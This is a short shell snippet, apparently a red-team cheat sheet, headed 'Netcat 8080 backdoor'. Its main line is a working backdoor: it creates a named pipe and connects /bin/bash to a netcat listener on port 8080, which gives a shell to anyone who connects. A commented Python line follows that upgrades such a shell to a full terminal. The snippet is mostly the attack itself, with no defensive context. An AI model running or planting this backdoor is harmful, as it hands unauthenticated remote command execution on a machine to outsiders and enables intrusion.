#Netcat 8080 backdoor

#Simulates the old "nc -e" command, opens nc backdoor
sudo mkfifo foo ; nc -lk 8080 0<foo | /bin/bash 1>foo

#Used by red team to spawn a shell, runs on attacker's end
#python -c 'import pty; pty.spawn("/bin/bash")'
